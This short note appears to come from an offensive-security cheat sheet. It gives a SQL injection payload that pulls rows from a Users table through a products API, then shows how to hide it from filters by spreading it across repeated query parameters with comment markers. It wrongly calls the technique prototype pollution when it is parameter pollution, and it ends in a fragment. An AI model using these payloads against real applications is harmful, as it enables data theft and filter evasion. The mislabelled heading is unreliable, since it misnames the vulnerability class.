# Obfuscation
## Prototype pollution

```
GET /api/products?prodID=9 UNION SELECT 1,2,3 FROM Users WHERE id=3 --
```

In those languages that append polluted parameters into a list (like Python), it is possible to obfuscate the payload above like this:

```
GET /api/products?prodID=9 /*&prodID=*/UNION /*&prodID=*/SELECT 1 &prodID=2 &prodID=3 FROM /*&prodID=*/Users /*&prodID=*/ WHERE id=3 --
```

+ MySQL query execution in comments